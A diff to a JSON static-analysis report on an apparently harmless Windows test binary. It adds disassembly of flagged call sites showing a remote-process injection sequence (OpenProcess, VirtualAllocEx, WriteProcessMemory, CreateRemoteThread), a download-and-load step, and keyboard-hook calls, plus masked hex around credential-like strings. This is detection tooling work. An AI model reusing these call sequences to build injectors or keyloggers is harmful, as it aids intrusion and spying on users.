@@ -23,21 +23,21 @@
     ]
   },
   "hashes": {
-    "md5": "d66cc605f1a2a27ba03d75d94b8c614a",
-    "sha1": "b6494791e9a560aa7fd6b5ebd4961a0ba5cb76be",
-    "sha256": "b289cf9996adf6315988dfafbddd89b224e4db1149dda2db3fe1bd01201cb086",
+    "md5": "dc2c65a0b0c26e2b1addc437769a627b",
+    "sha1": "259f69648c79cab1075ce69b787f3641c5ba53b2",
+    "sha256": "1406ad895c1951cd1baf30a0f4c66b64d16b5758cd682d569e2beb37828d94bd",
     "imphash": "c75895b40ef048b1c333b95f1de4c9a7"
   },
   "entropy": {
-    "overall": 6.301,
+    "overall": 6.326,
     "windowSize": 256,
     "windows": [
       3.1,
       1.329,
       1.246,
       0,
-      0.111,
-      0,
+      4.595,
+      3.217,
       3.415,
       3.25,
       2.86,
@@ -115,7 +115,7 @@
       "virtualSize": 512,
       "rawSize": 512,
       "offset": 1024,
-      "entropy": 0.061,
+      "entropy": 4.209,
       "flags": [
         "R",
         "X"
@@ -1048,7 +1048,400 @@
         "allocate or map memory in another process: KERNEL32.dll!VirtualAllocEx",
         "write to another process: KERNEL32.dll!WriteProcessMemory",
         "start or hijack a thread there: KERNEL32.dll!CreateRemoteThread",
-        "process handle: KERNEL32.dll!OpenProcess"
+        "process handle: KERNEL32.dll!OpenProcess",
+        "code: 4 call sites in .text (see the code blocks)"
+      ],
+      "code": [
+        {
+          "kind": "disasm",
+          "title": "call to KERNEL32.dll!VirtualAllocEx in .text",
+          "section": ".text",
+          "offset": 1213,
+          "address": "0x1400010bd",
+          "arch": "x86-64",
+          "lines": [
+            {
+              "address": "0x1400010bd",
+              "offset": 1213,
+              "bytes": "41 b8 a4 01 00 00",
+              "text": "mov r8d, 0x1a4"
+            },
+            {
+              "address": "0x1400010c3",
+              "offset": 1219,
+              "bytes": "ff 15 ef 10 00 00",
+              "text": "call qword ptr [rip+0x10ef]",
+              "note": "KERNEL32.dll!OpenProcess"
+            },
+            {
+              "address": "0x1400010c9",
+              "offset": 1225,
+              "bytes": "48 89 44 24 48",
+              "text": "mov qword ptr [rsp+0x48], rax"
+            },
+            {
+              "address": "0x1400010ce",
+              "offset": 1230,
+              "bytes": "48 8b 4c 24 48",
+              "text": "mov rcx, qword ptr [rsp+0x48]"
+            },
+            {
+              "address": "0x1400010d3",
+              "offset": 1235,
+              "bytes": "31 d2",
+              "text": "xor edx, edx"
+            },
+            {
+              "address": "0x1400010d5",
+              "offset": 1237,
+              "bytes": "41 b8 00 10 00 00",
+              "text": "mov r8d, 0x1000"
+            },
+            {
+              "address": "0x1400010db",
+              "offset": 1243,
+              "bytes": "41 b9 00 30 00 00",
+              "text": "mov r9d, 0x3000"
+            },
+            {
+              "address": "0x1400010e1",
+              "offset": 1249,
+              "bytes": "c7 44 24 20 40 00 00 00",
+              "text": "mov dword ptr [rsp+0x20], 0x40"
+            },
+            {
+              "address": "0x1400010e9",
+              "offset": 1257,
+              "bytes": "ff 15 b1 10 00 00",
+              "text": "call qword ptr [rip+0x10b1]",
+              "note": "KERNEL32.dll!VirtualAllocEx",
+              "highlight": true
+            },
+            {
+              "address": "0x1400010ef",
+              "offset": 1263,
+              "bytes": "48 89 44 24 50",
+              "text": "mov qword ptr [rsp+0x50], rax"
+            },
+            {
+              "address": "0x1400010f4",
+              "offset": 1268,
+              "bytes": "48 8b 4c 24 48",
+              "text": "mov rcx, qword ptr [rsp+0x48]"
+            },
+            {
+              "address": "0x1400010f9",
+              "offset": 1273,
+              "bytes": "48 8b 54 24 50",
+              "text": "mov rdx, qword ptr [rsp+0x50]"
+            },
+            {
+              "address": "0x1400010fe",
+              "offset": 1278,
+              "bytes": "4c 8d 05 fb 1e 00 00",
+              "text": "lea r8, [rip+0x1efb]",
+              "note": "0x140003000 in .data"
+            }
+          ],
+          "limitations": [
+            "x86-64 code decoded as a linear sweep (ARM64 and other instruction sets are not supported): data inside a code section can be read as instructions, and one wrong byte shifts what follows.",
+            "Only calls through the import table and import thunks are found: functions resolved at run time are invisible, and packed or protected code hides its real calls.",
+            "A view of the code, not a decompiler, an emulator or a verdict: nothing was executed, and the code shows what is called, not why."
+          ]
+        },
+        {
+          "kind": "disasm",
+          "title": "call to KERNEL32.dll!WriteProcessMemory in .text",
+          "section": ".text",
+          "offset": 1249,
+          "address": "0x1400010e1",
+          "arch": "x86-64",
+          "lines": [
+            {
+              "address": "0x1400010e1",
+              "offset": 1249,
+              "bytes": "c7 44 24 20 40 00 00 00",
+              "text": "mov dword ptr [rsp+0x20], 0x40"
+            },
+            {
+              "address": "0x1400010e9",
+              "offset": 1257,
+              "bytes": "ff 15 b1 10 00 00",
+              "text": "call qword ptr [rip+0x10b1]",
+              "note": "KERNEL32.dll!VirtualAllocEx"
+            },
+            {
+              "address": "0x1400010ef",
+              "offset": 1263,
+              "bytes": "48 89 44 24 50",
+              "text": "mov qword ptr [rsp+0x50], rax"
+            },
+            {
+              "address": "0x1400010f4",
+              "offset": 1268,
+              "bytes": "48 8b 4c 24 48",
+              "text": "mov rcx, qword ptr [rsp+0x48]"
+            },
+            {
+              "address": "0x1400010f9",
+              "offset": 1273,
+              "bytes": "48 8b 54 24 50",
+              "text": "mov rdx, qword ptr [rsp+0x50]"
+            },
+            {
+              "address": "0x1400010fe",
+              "offset": 1278,
+              "bytes": "4c 8d 05 fb 1e 00 00",
+              "text": "lea r8, [rip+0x1efb]",
+              "note": "0x140003000 in .data"
+            },
+            {
+              "address": "0x140001105",
+              "offset": 1285,
+              "bytes": "41 b9 00 02 00 00",
+              "text": "mov r9d, 0x200"
+            },
+            {
+              "address": "0x14000110b",
+              "offset": 1291,
+              "bytes": "48 c7 44 24 20 00 00 00 00",
+              "text": "mov qword ptr [rsp+0x20], 0x0"
+            },
+            {
+              "address": "0x140001114",
+              "offset": 1300,
+              "bytes": "ff 15 8e 10 00 00",
+              "text": "call qword ptr [rip+0x108e]",
+              "note": "KERNEL32.dll!WriteProcessMemory",
+              "highlight": true
+            },
+            {
+              "address": "0x14000111a",
+              "offset": 1306,
+              "bytes": "48 8b 4c 24 48",
+              "text": "mov rcx, qword ptr [rsp+0x48]"
+            },
+            {
+              "address": "0x14000111f",
+              "offset": 1311,
+              "bytes": "31 d2",
+              "text": "xor edx, edx"
+            },
+            {
+              "address": "0x140001121",
+              "offset": 1313,
+              "bytes": "45 31 c0",
+              "text": "xor r8d, r8d"
+            },
+            {
+              "address": "0x140001124",
+              "offset": 1316,
+              "bytes": "4c 8b 4c 24 50",
+              "text": "mov r9, qword ptr [rsp+0x50]"
+            }
+          ],
+          "limitations": [
+            "x86-64 code decoded as a linear sweep (ARM64 and other instruction sets are not supported): data inside a code section can be read as instructions, and one wrong byte shifts what follows.",
+            "Only calls through the import table and import thunks are found: functions resolved at run time are invisible, and packed or protected code hides its real calls.",
+            "A view of the code, not a decompiler, an emulator or a verdict: nothing was executed, and the code shows what is called, not why."
+          ]
+        },
+        {
+          "kind": "disasm",
+          "title": "call to KERNEL32.dll!CreateRemoteThread in .text",
+          "section": ".text",
+          "offset": 1300,
+          "address": "0x140001114",
+          "arch": "x86-64",
+          "lines": [
+            {
+              "address": "0x140001114",
+              "offset": 1300,
+              "bytes": "ff 15 8e 10 00 00",
+              "text": "call qword ptr [rip+0x108e]",
+              "note": "KERNEL32.dll!WriteProcessMemory"
+            },
+            {
+              "address": "0x14000111a",
+              "offset": 1306,
+              "bytes": "48 8b 4c 24 48",
+              "text": "mov rcx, qword ptr [rsp+0x48]"
+            },
+            {
+              "address": "0x14000111f",
+              "offset": 1311,
+              "bytes": "31 d2",
+              "text": "xor edx, edx"
+            },
+            {
+              "address": "0x140001121",
+              "offset": 1313,
+              "bytes": "45 31 c0",
+              "text": "xor r8d, r8d"
+            },
+            {
+              "address": "0x140001124",
+              "offset": 1316,
+              "bytes": "4c 8b 4c 24 50",
+              "text": "mov r9, qword ptr [rsp+0x50]"
+            },
+            {
+              "address": "0x140001129",
+              "offset": 1321,
+              "bytes": "48 c7 44 24 20 00 00 00 00",
+              "text": "mov qword ptr [rsp+0x20], 0x0"
+            },
+            {
+              "address": "0x140001132",
+              "offset": 1330,
+              "bytes": "48 c7 44 24 28 00 00 00 00",
+              "text": "mov qword ptr [rsp+0x28], 0x0"
+            },
+            {
+              "address": "0x14000113b",
+              "offset": 1339,
+              "bytes": "48 c7 44 24 30 00 00 00 00",
+              "text": "mov qword ptr [rsp+0x30], 0x0"
+            },
+            {
+              "address": "0x140001144",
+              "offset": 1348,
+              "bytes": "ff 15 66 10 00 00",
+              "text": "call qword ptr [rip+0x1066]",
+              "note": "KERNEL32.dll!CreateRemoteThread",
+              "highlight": true
+            },
+            {
+              "address": "0x14000114a",
+              "offset": 1354,
+              "bytes": "48 8b 4c 24 40",
+              "text": "mov rcx, qword ptr [rsp+0x40]"
+            },
+            {
+              "address": "0x14000114f",
+              "offset": 1359,
+              "bytes": "48 8d 15 ba 1e 00 00",
+              "text": "lea rdx, [rip+0x1eba]",
+              "note": "0x140003010 in .data"
+            },
+            {
+              "address": "0x140001156",
+              "offset": 1366,
+              "bytes": "ff 15 34 10 00 00",
+              "text": "call qword ptr [rip+0x1034]",
+              "note": "KERNEL32.dll!GetProcAddress"
+            },
+            {
+              "address": "0x14000115c",
+              "offset": 1372,
+              "bytes": "31 c9",
+              "text": "xor ecx, ecx"
+            }
+          ],
+          "limitations": [
+            "x86-64 code decoded as a linear sweep (ARM64 and other instruction sets are not supported): data inside a code section can be read as instructions, and one wrong byte shifts what follows.",
+            "Only calls through the import table and import thunks are found: functions resolved at run time are invisible, and packed or protected code hides its real calls.",
+            "A view of the code, not a decompiler, an emulator or a verdict: nothing was executed, and the code shows what is called, not why."
+          ]
+        },
+        {
+          "kind": "disasm",
+          "title": "call to KERNEL32.dll!OpenProcess in .text",
+          "section": ".text",
+          "offset": 1173,
+          "address": "0x140001095",
+          "arch": "x86-64",
+          "lines": [
+            {
+              "address": "0x140001095",
+              "offset": 1173,
+              "bytes": "48 c7 44 24 20 00 00 00 00",
+              "text": "mov qword ptr [rsp+0x20], 0x0"
+            },
+            {
+              "address": "0x14000109e",
+              "offset": 1182,
+              "bytes": "ff 15 1c 13 00 00",
+              "text": "call qword ptr [rip+0x131c]",
+              "note": "URLMON.dll!URLDownloadToFileA"
+            },
+            {
+              "address": "0x1400010a4",
+              "offset": 1188,
+              "bytes": "48 8d 0d 55 1f 00 00",
+              "text": "lea rcx, [rip+0x1f55]",
+              "note": "0x140003000 in .data"
+            },
+            {
+              "address": "0x1400010ab",
+              "offset": 1195,
+              "bytes": "ff 15 e7 10 00 00",
+              "text": "call qword ptr [rip+0x10e7]",
+              "note": "KERNEL32.dll!LoadLibraryA"
+            },
+            {
+              "address": "0x1400010b1",
+              "offset": 1201,
+              "bytes": "48 89 44 24 40",
+              "text": "mov qword ptr [rsp+0x40], rax"
+            },
+            {
+              "address": "0x1400010b6",
+              "offset": 1206,
+              "bytes": "b9 ff ff 1f 00",
+              "text": "mov ecx, 0x1fffff"
+            },
+            {
+              "address": "0x1400010bb",
+              "offset": 1211,
+              "bytes": "31 d2",
+              "text": "xor edx, edx"
+            },
+            {
+              "address": "0x1400010bd",
+              "offset": 1213,
+              "bytes": "41 b8 a4 01 00 00",
+              "text": "mov r8d, 0x1a4"
+            },
+            {
+              "address": "0x1400010c3",
+              "offset": 1219,
+              "bytes": "ff 15 ef 10 00 00",
+              "text": "call qword ptr [rip+0x10ef]",
+              "note": "KERNEL32.dll!OpenProcess",
+              "highlight": true
+            },
+            {
+              "address": "0x1400010c9",
+              "offset": 1225,
+              "bytes": "48 89 44 24 48",
+              "text": "mov qword ptr [rsp+0x48], rax"
+            },
+            {
+              "address": "0x1400010ce",
+              "offset": 1230,
+              "bytes": "48 8b 4c 24 48",
+              "text": "mov rcx, qword ptr [rsp+0x48]"
+            },
+            {
+              "address": "0x1400010d3",
+              "offset": 1235,
+              "bytes": "31 d2",
+              "text": "xor edx, edx"
+            },
+            {
+              "address": "0x1400010d5",
+              "offset": 1237,
+              "bytes": "41 b8 00 10 00 00",
+              "text": "mov r8d, 0x1000"
+            }
+          ],
+          "limitations": [
+            "x86-64 code decoded as a linear sweep (ARM64 and other instruction sets are not supported): data inside a code section can be read as instructions, and one wrong byte shifts what follows.",
+            "Only calls through the import table and import thunks are found: functions resolved at run time are invisible, and packed or protected code hides its real calls.",
+            "A view of the code, not a decompiler, an emulator or a verdict: nothing was executed, and the code shows what is called, not why."
+          ]
+        }
       ],
       "limitations": [
         "API presence alone proves nothing: legitimate software (debuggers, installers, security and remote-support tools, games, browsers) imports the same functions.",
@@ -1065,6 +1458,78 @@
       "evidence": [
         "offset 0xf5e (ascii): AKIA…(20 chars)"
       ],
+      "code": [
+        {
+          "kind": "hex",
+          "title": "Bytes around the AWS access key ID at file offset 0xf5e (value masked)",
+          "section": ".config",
+          "offset": 3856,
+          "lines": [
+            {
+              "offset": 3856,
+              "bytes": "67 5c 73 76 63 5c 75 70 64 61 74 65 2e 65 78 65",
+              "text": "g\\svc\\update.exe"
+            },
+            {
+              "offset": 3872,
+              "bytes": "00 4d 6f 7a 69 6c 6c 61 2f 35 2e 30 20 28 57 69",
+              "text": ".Mozilla/5.0 (Wi"
+            },
+            {
+              "offset": 3888,
+              "bytes": "6e 64 6f 77 73 20 4e 54 20 31 30 2e 30 3b 20 57",
+              "text": "ndows NT 10.0; W"
+            },
+            {
+              "offset": 3904,
+              "bytes": "69 6e 36 34 3b 20 78 36 34 29 20 41 70 70 6c 65",
+              "text": "in64; x64) Apple"
+            },
+            {
+              "offset": 3920,
+              "bytes": "57 65 62 4b 69 74 2f 35 33 37 2e 33 36 00 2a 2a",
+              "text": "WebKit/537.36.**",
+              "highlight": true
+            },
+            {
+              "offset": 3936,
+              "bytes": "2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a",
+              "text": "****************",
+              "highlight": true
+            },
+            {
+              "offset": 3952,
+              "bytes": "2a 2a 00 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a",
+              "text": "**.*************",
+              "highlight": true
+            },
+            {
+              "offset": 3968,
+              "bytes": "2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a",
+              "text": "****************"
+            },
+            {
+              "offset": 3984,
+              "bytes": "2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 00 74 68 69 73",
+              "text": "***********.this"
+            },
+            {
+              "offset": 4000,
+              "bytes": "20 69 73 20 61 20 68 61 72 6d 6c 65 73 73 20 63",
+              "text": " is a harmless c"
+            },
+            {
+              "offset": 4016,
+              "bytes": "6f 6e 66 69 67 75 72 61 74 69 6f 6e 20 73 61 6d",
+              "text": "onfiguration sam"
+            }
+          ],
+          "limitations": [
+            "A raw window over the file: the bytes are shown as stored, 16 to a row, and nothing says that any code uses them.",
+            "The bytes of credential-like values are replaced by 2a (an asterisk) in the hex and ASCII columns, so the values cannot be recovered from this view."
+          ]
+        }
+      ],
       "limitations": [
         "Pattern match only: the credential was not validated and may be a placeholder, documentation example, test fixture or an already revoked key.",
         "Values are redacted in every output: only the first four characters and the length are kept.",
@@ -1079,6 +1544,78 @@
       "confidence": "medium",
       "evidence": [
         "offset 0xf73 (ascii): ghp_…(40 chars)"
+      ],
+      "code": [
+        {
+          "kind": "hex",
+          "title": "Bytes around the GitHub token at file offset 0xf73 (value masked)",
+          "section": ".config",
+          "offset": 3888,
+          "lines": [
+            {
+              "offset": 3888,
+              "bytes": "6e 64 6f 77 73 20 4e 54 20 31 30 2e 30 3b 20 57",
+              "text": "ndows NT 10.0; W"
+            },
+            {
+              "offset": 3904,
+              "bytes": "69 6e 36 34 3b 20 78 36 34 29 20 41 70 70 6c 65",
+              "text": "in64; x64) Apple"
+            },
+            {
+              "offset": 3920,
+              "bytes": "57 65 62 4b 69 74 2f 35 33 37 2e 33 36 00 2a 2a",
+              "text": "WebKit/537.36.**"
+            },
+            {
+              "offset": 3936,
+              "bytes": "2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a",
+              "text": "****************"
+            },
+            {
+              "offset": 3952,
+              "bytes": "2a 2a 00 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a",
+              "text": "**.*************",
+              "highlight": true
+            },
+            {
+              "offset": 3968,
+              "bytes": "2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a",
+              "text": "****************",
+              "highlight": true
+            },
+            {
+              "offset": 3984,
+              "bytes": "2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 00 74 68 69 73",
+              "text": "***********.this",
+              "highlight": true
+            },
+            {
+              "offset": 4000,
+              "bytes": "20 69 73 20 61 20 68 61 72 6d 6c 65 73 73 20 63",
+              "text": " is a harmless c"
+            },
+            {
+              "offset": 4016,
+              "bytes": "6f 6e 66 69 67 75 72 61 74 69 6f 6e 20 73 61 6d",
+              "text": "onfiguration sam"
+            },
+            {
+              "offset": 4032,
+              "bytes": "70 6c 65 00 00 00 00 00 00 00 00 00 00 00 00 00",
+              "text": "ple............."
+            },
+            {
+              "offset": 4048,
+              "bytes": "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00",
+              "text": "................"
+            }
+          ],
+          "limitations": [
+            "A raw window over the file: the bytes are shown as stored, 16 to a row, and nothing says that any code uses them.",
+            "The bytes of credential-like values are replaced by 2a (an asterisk) in the hex and ASCII columns, so the values cannot be recovered from this view."
+          ]
+        }
       ],
       "limitations": [
         "Pattern match only: the credential was not validated and may be a placeholder, documentation example, test fixture or an already revoked key.",
@@ -1108,7 +1645,211 @@
       "confidence": "low",
       "evidence": [
         "download: URLMON.dll!URLDownloadToFileA",
-        "launch: KERNEL32.dll!CreateProcessW"
+        "launch: KERNEL32.dll!CreateProcessW",
+        "code: 2 call sites in .text (see the code blocks)"
+      ],
+      "code": [
+        {
+          "kind": "disasm",
+          "title": "call to URLMON.dll!URLDownloadToFileA in .text",
+          "section": ".text",
+          "offset": 1135,
+          "address": "0x14000106f",
+          "arch": "x86-64",
+          "lines": [
+            {
+              "address": "0x14000106f",
+              "offset": 1135,
+              "bytes": "48 8d 15 9a 1f 00 00",
+              "text": "lea rdx, [rip+0x1f9a]",
+              "note": "0x140003010 in .data"
+            },
+            {
+              "address": "0x140001076",
+              "offset": 1142,
+              "bytes": "41 b8 10 00 00 00",
+              "text": "mov r8d, 0x10"
+            },
+            {
+              "address": "0x14000107c",
+              "offset": 1148,
+              "bytes": "ff 15 66 12 00 00",
+              "text": "call qword ptr [rip+0x1266]",
+              "note": "WS2_32.dll!connect"
+            },
+            {
+              "address": "0x140001082",
+              "offset": 1154,
+              "bytes": "31 c9",
+              "text": "xor ecx, ecx"
+            },
+            {
+              "address": "0x140001084",
+              "offset": 1156,
+              "bytes": "48 8d 15 75 1f 00 00",
+              "text": "lea rdx, [rip+0x1f75]",
+              "note": "0x140003000 in .data"
+            },
+            {
+              "address": "0x14000108b",
+              "offset": 1163,
+              "bytes": "4c 8d 05 7e 1f 00 00",
+              "text": "lea r8, [rip+0x1f7e]",
+              "note": "0x140003010 in .data"
+            },
+            {
+              "address": "0x140001092",
+              "offset": 1170,
+              "bytes": "45 31 c9",
+              "text": "xor r9d, r9d"
+            },
+            {
+              "address": "0x140001095",
+              "offset": 1173,
+              "bytes": "48 c7 44 24 20 00 00 00 00",
+              "text": "mov qword ptr [rsp+0x20], 0x0"
+            },
+            {
+              "address": "0x14000109e",
+              "offset": 1182,
+              "bytes": "ff 15 1c 13 00 00",
+              "text": "call qword ptr [rip+0x131c]",
+              "note": "URLMON.dll!URLDownloadToFileA",
+              "highlight": true
+            },
+            {
+              "address": "0x1400010a4",
+              "offset": 1188,
+              "bytes": "48 8d 0d 55 1f 00 00",
+              "text": "lea rcx, [rip+0x1f55]",
+              "note": "0x140003000 in .data"
+            },
+            {
+              "address": "0x1400010ab",
+              "offset": 1195,
+              "bytes": "ff 15 e7 10 00 00",
+              "text": "call qword ptr [rip+0x10e7]",
+              "note": "KERNEL32.dll!LoadLibraryA"
+            },
+            {
+              "address": "0x1400010b1",
+              "offset": 1201,
+              "bytes": "48 89 44 24 40",
+              "text": "mov qword ptr [rsp+0x40], rax"
+            },
+            {
+              "address": "0x1400010b6",
+              "offset": 1206,
+              "bytes": "b9 ff ff 1f 00",
+              "text": "mov ecx, 0x1fffff"
+            }
+          ],
+          "limitations": [
+            "x86-64 code decoded as a linear sweep (ARM64 and other instruction sets are not supported): data inside a code section can be read as instructions, and one wrong byte shifts what follows.",
+            "Only calls through the import table and import thunks are found: functions resolved at run time are invisible, and packed or protected code hides its real calls.",
+            "A view of the code, not a decompiler, an emulator or a verdict: nothing was executed, and the code shows what is called, not why."
+          ]
+        },
+        {
+          "kind": "disasm",
+          "title": "call to KERNEL32.dll!CreateProcessW through a thunk in .text",
+          "section": ".text",
+          "offset": 1348,
+          "address": "0x140001144",
+          "arch": "x86-64",
+          "lines": [
+            {
+              "address": "0x140001144",
+              "offset": 1348,
+              "bytes": "ff 15 66 10 00 00",
+              "text": "call qword ptr [rip+0x1066]",
+              "note": "KERNEL32.dll!CreateRemoteThread"
+            },
+            {
+              "address": "0x14000114a",
+              "offset": 1354,
+              "bytes": "48 8b 4c 24 40",
+              "text": "mov rcx, qword ptr [rsp+0x40]"
+            },
+            {
+              "address": "0x14000114f",
+              "offset": 1359,
+              "bytes": "48 8d 15 ba 1e 00 00",
+              "text": "lea rdx, [rip+0x1eba]",
+              "note": "0x140003010 in .data"
+            },
+            {
+              "address": "0x140001156",
+              "offset": 1366,
+              "bytes": "ff 15 34 10 00 00",
+              "text": "call qword ptr [rip+0x1034]",
+              "note": "KERNEL32.dll!GetProcAddress"
+            },
+            {
+              "address": "0x14000115c",
+              "offset": 1372,
+              "bytes": "31 c9",
+              "text": "xor ecx, ecx"
+            },
+            {
+              "address": "0x14000115e",
+              "offset": 1374,
+              "bytes": "48 8d 15 ab 1e 00 00",
+              "text": "lea rdx, [rip+0x1eab]",
+              "note": "0x140003010 in .data"
+            },
+            {
+              "address": "0x140001165",
+              "offset": 1381,
+              "bytes": "45 31 c0",
+              "text": "xor r8d, r8d"
+            },
+            {
+              "address": "0x140001168",
+              "offset": 1384,
+              "bytes": "45 31 c9",
+              "text": "xor r9d, r9d"
+            },
+            {
+              "address": "0x14000116b",
+              "offset": 1387,
+              "bytes": "e8 10 00 00 00",
+              "text": "call 0x140001180",
+              "note": "KERNEL32.dll!CreateProcessW (through the thunk at 0x140001180)",
+              "highlight": true
+            },
+            {
+              "address": "0x140001170",
+              "offset": 1392,
+              "bytes": "31 c9",
+              "text": "xor ecx, ecx"
+            },
+            {
+              "address": "0x140001172",
+              "offset": 1394,
+              "bytes": "ff 15 10 10 00 00",
+              "text": "call qword ptr [rip+0x1010]",
+              "note": "KERNEL32.dll!ExitProcess"
+            },
+            {
+              "address": "0x140001178",
+              "offset": 1400,
+              "bytes": "31 c0",
+              "text": "xor eax, eax"
+            },
+            {
+              "address": "0x14000117a",
+              "offset": 1402,
+              "bytes": "48 83 c4 58",
+              "text": "add rsp, 0x58"
+            }
+          ],
+          "limitations": [
+            "x86-64 code decoded as a linear sweep (ARM64 and other instruction sets are not supported): data inside a code section can be read as instructions, and one wrong byte shifts what follows.",
+            "Only calls through the import table and import thunks are found: functions resolved at run time are invisible, and packed or protected code hides its real calls.",
+            "A view of the code, not a decompiler, an emulator or a verdict: nothing was executed, and the code shows what is called, not why."
+          ]
+        }
       ],
       "limitations": [
         "API presence alone proves nothing: legitimate software (debuggers, installers, security and remote-support tools, games, browsers) imports the same functions.",
@@ -1125,12 +1866,215 @@
       "evidence": [
         "hook installation: USER32.dll!SetWindowsHookExA",
         "key state / raw input: USER32.dll!GetAsyncKeyState",
-        "window context: USER32.dll!GetForegroundWindow"
+        "window context: USER32.dll!GetForegroundWindow",
+        "code: 2 call sites in .text (see the code blocks)"
+      ],
+      "code": [
+        {
+          "kind": "disasm",
+          "title": "call to USER32.dll!SetWindowsHookExA in .text",
+          "section": ".text",
+          "offset": 1038,
+          "address": "0x14000100e",
+          "arch": "x86-64",
+          "lines": [
+            {
+              "address": "0x14000100e",
+              "offset": 1038,
+              "bytes": "cc",
+              "text": "int3"
+            },
+            {
+              "address": "0x14000100f",
+              "offset": 1039,
+              "bytes": "cc",
+              "text": "int3"
+            },
+            {
+              "address": "0x140001010",
+              "offset": 1040,
+              "bytes": "48 83 ec 58",
+              "text": "sub rsp, 0x58"
+            },
+            {
+              "address": "0x140001014",
+              "offset": 1044,
+              "bytes": "ff 15 a6 11 00 00",
+              "text": "call qword ptr [rip+0x11a6]",
+              "note": "KERNEL32.dll!IsDebuggerPresent"
+            },
+            {
+              "address": "0x14000101a",
+              "offset": 1050,
+              "bytes": "b9 0d 00 00 00",
+              "text": "mov ecx, 0xd"
+            },
+            {
+              "address": "0x14000101f",
+              "offset": 1055,
+              "bytes": "48 8d 15 da 1f 00 00",
+              "text": "lea rdx, [rip+0x1fda]",
+              "note": "0x140003000 in .data"
+            },
+            {
+              "address": "0x140001026",
+              "offset": 1062,
+              "bytes": "45 31 c0",
+              "text": "xor r8d, r8d"
+            },
+            {
+              "address": "0x140001029",
+              "offset": 1065,
+              "bytes": "45 31 c9",
+              "text": "xor r9d, r9d"
+            },
+            {
+              "address": "0x14000102c",
+              "offset": 1068,
+              "bytes": "ff 15 16 12 00 00",
+              "text": "call qword ptr [rip+0x1216]",
+              "note": "USER32.dll!SetWindowsHookExA",
+              "highlight": true
+            },
+            {
+              "address": "0x140001032",
+              "offset": 1074,
+              "bytes": "b9 41 00 00 00",
+              "text": "mov ecx, 0x41"
+            },
+            {
+              "address": "0x140001037",
+              "offset": 1079,
+              "bytes": "ff 15 13 12 00 00",
+              "text": "call qword ptr [rip+0x1213]",
+              "note": "USER32.dll!GetAsyncKeyState"
+            },
+            {
+              "address": "0x14000103d",
+              "offset": 1085,
+              "bytes": "b9 02 02 00 00",
+              "text": "mov ecx, 0x202"
+            },
+            {
+              "address": "0x140001042",
+              "offset": 1090,
+              "bytes": "48 8d 15 c7 1f 00 00",
+              "text": "lea rdx, [rip+0x1fc7]",
+              "note": "0x140003010 in .data"
+            }
+          ],
+          "limitations": [
+            "x86-64 code decoded as a linear sweep (ARM64 and other instruction sets are not supported): data inside a code section can be read as instructions, and one wrong byte shifts what follows.",
+            "Only calls through the import table and import thunks are found: functions resolved at run time are invisible, and packed or protected code hides its real calls.",
+            "A view of the code, not a decompiler, an emulator or a verdict: nothing was executed, and the code shows what is called, not why."
+          ]
+        },
+        {
+          "kind": "disasm",
+          "title": "call to USER32.dll!GetAsyncKeyState in .text",
+          "section": ".text",
+          "offset": 1040,
+          "address": "0x140001010",
+          "arch": "x86-64",
+          "lines": [
+            {
+              "address": "0x140001010",
+              "offset": 1040,
+              "bytes": "48 83 ec 58",
+              "text": "sub rsp, 0x58"
+            },
+            {
+              "address": "0x140001014",
+              "offset": 1044,
+              "bytes": "ff 15 a6 11 00 00",
+              "text": "call qword ptr [rip+0x11a6]",
+              "note": "KERNEL32.dll!IsDebuggerPresent"
+            },
+            {
+              "address": "0x14000101a",
+              "offset": 1050,
+              "bytes": "b9 0d 00 00 00",
+              "text": "mov ecx, 0xd"
+            },
+            {
+              "address": "0x14000101f",
+              "offset": 1055,
+              "bytes": "48 8d 15 da 1f 00 00",
+              "text": "lea rdx, [rip+0x1fda]",
+              "note": "0x140003000 in .data"
+            },
+            {
+              "address": "0x140001026",
+              "offset": 1062,
+              "bytes": "45 31 c0",
+              "text": "xor r8d, r8d"
+            },
+            {
+              "address": "0x140001029",
+              "offset": 1065,
+              "bytes": "45 31 c9",
+              "text": "xor r9d, r9d"
+            },
+            {
+              "address": "0x14000102c",
+              "offset": 1068,
+              "bytes": "ff 15 16 12 00 00",
+              "text": "call qword ptr [rip+0x1216]",
+              "note": "USER32.dll!SetWindowsHookExA"
+            },
+            {
+              "address": "0x140001032",
+              "offset": 1074,
+              "bytes": "b9 41 00 00 00",
+              "text": "mov ecx, 0x41"
+            },
+            {
+              "address": "0x140001037",
+              "offset": 1079,
+              "bytes": "ff 15 13 12 00 00",
+              "text": "call qword ptr [rip+0x1213]",
+              "note": "USER32.dll!GetAsyncKeyState",
+              "highlight": true
+            },
+            {
+              "address": "0x14000103d",
+              "offset": 1085,
+              "bytes": "b9 02 02 00 00",
+              "text": "mov ecx, 0x202"
+            },
+            {
+              "address": "0x140001042",
+              "offset": 1090,
+              "bytes": "48 8d 15 c7 1f 00 00",
+              "text": "lea rdx, [rip+0x1fc7]",
+              "note": "0x140003010 in .data"
+            },
+            {
+              "address": "0x140001049",
+              "offset": 1097,
+              "bytes": "ff 15 89 12 00 00",
+              "text": "call qword ptr [rip+0x1289]",
+              "note": "WS2_32.dll!WSAStartup"
+            },
+            {
+              "address": "0x14000104f",
+              "offset": 1103,
+              "bytes": "b9 02 00 00 00",
+              "text": "mov ecx, 0x2"
+            }
+          ],
+          "limitations": [
+            "x86-64 code decoded as a linear sweep (ARM64 and other instruction sets are not supported): data inside a code section can be read as instructions, and one wrong byte shifts what follows.",
+            "Only calls through the import table and import thunks are found: functions resolved at run time are invisible, and packed or protected code hides its real calls.",
+            "A view of the code, not a decompiler, an emulator or a verdict: nothing was executed, and the code shows what is called, not why."
+          ]
+        }
       ],
       "limitations": [
         "API presence alone proves nothing: legitimate software (debuggers, installers, security and remote-support tools, games, browsers) imports the same functions.",
         "Input-method editors, accessibility tools, macro/automation utilities and games use these APIs for legitimate hotkeys and overlays.",
-        "Functions resolved at run time (GetProcAddress, dlsym) or hidden by a packer are not in the import table, so a missing cluster proves nothing either."
